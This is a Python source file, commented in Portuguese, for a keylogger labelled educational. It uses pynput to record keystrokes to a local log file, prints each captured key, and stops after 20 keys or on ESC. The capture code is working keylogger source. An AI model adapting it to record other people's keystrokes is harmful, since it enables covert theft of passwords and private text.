import os
from pynput import keyboard

# ----------------------------------------------------------------------
# ATENÇÃO: ESTE CÓDIGO É ESTE ESTREITAMENTE PARA FINS EDUCACIONAIS.
# Ele registra as teclas que você digita na pasta 'logs'.
# ----------------------------------------------------------------------

# 1. Definições de Caminho
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, 'logs', 'keystrokes_log.txt')
MAX_LOG_ENTRIES = 20 # Limita o número de teclas para parar o teste automaticamente

contador = 0

def on_press(key):
    """Função chamada a cada tecla pressionada."""
    global contador
    contador += 1
    
    # 2. Captura e formatação da tecla
    try:
        char = key.char
    except AttributeError:
        # Trata teclas especiais (Enter, Shift, Alt, etc.)
        if key == keyboard.Key.space:
            char = ' '
        else:
            char = f'[{str(key).split(".")[-1].upper()}]'

    # 3. Registro no arquivo
    with open(LOG_FILE, 'a') as f:
        f.write(char)

    print(f"Tecla registrada: {char.strip()}")
    
    # 4. Condição de Parada (para fins de teste seguro)
    if contador >= MAX_LOG_ENTRIES:
        print(f"\n[AVISO] Limite de {MAX_LOG_ENTRIES} teclas atingido. Parando Keylogger.")
        return False # Retorna False para parar o listener

def on_release(key):
    """Função chamada a cada tecla liberada (Não utilizada para registro)."""
    # Se o usuário pressionar ESC, o keylogger para.
    if key == keyboard.Key.esc:
        print("\nKeylogger parado manualmente pelo usuário (ESC).")
        return False

def iniciar_keylogger_simulado():
    """Inicia o escutador de teclado."""
    print("--- INICIANDO SIMULAÇÃO DE KEYLOGGER ---")
    print(f"Logs serão salvos em: {LOG_FILE}")
    print(f"Pressione {MAX_LOG_ENTRIES} teclas ou [ESC] para parar.")
    
    # 5. Configuração do Listener (Escutador)
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"[ERRO] Falha ao iniciar o listener: {e}")

if __name__ == "__main__":
    # Garante que a pasta de logs exista
    os.makedirs(os.path.join(BASE_DIR, 'logs'), exist_ok=True)
    iniciar_keylogger_simulado()
    print("--- KEYLOGGER SIMULADO CONCLUÍDO ---")
